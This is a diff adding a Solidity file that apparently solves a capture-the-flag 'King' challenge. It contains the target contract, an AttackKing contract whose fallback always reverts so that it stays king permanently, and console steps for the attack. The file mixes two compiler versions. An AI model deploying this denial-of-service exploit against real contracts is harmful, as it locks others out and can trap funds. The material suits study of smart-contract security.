@@ -1,0 +1,56 @@
+pragma solidity ^0.6.0;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor() public payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
+}
+
+pragma solidity ^0.4.18;
+
+contract AttackKing {
+
+constructor (address _king) public payable {
+
+address(_king).call.value(msg.value)("");
+
+} 
+
+function () external payable {
+revert('You lose!');
+
+}
+
+}
+
+**Web3 Browser Console**
+
+contract.prize()
+
+// send more than current prize in contract
+
+await contract._king()
+
+contract address of AttackKing
+
+// attacker will deploy AttackKing contract with 1 ETH, this will send 1 ETH to King contract and assign malicious AttackKing contract
+
+// Other callers won't be able to send ether via fallback function, hence, attack will become permanent king
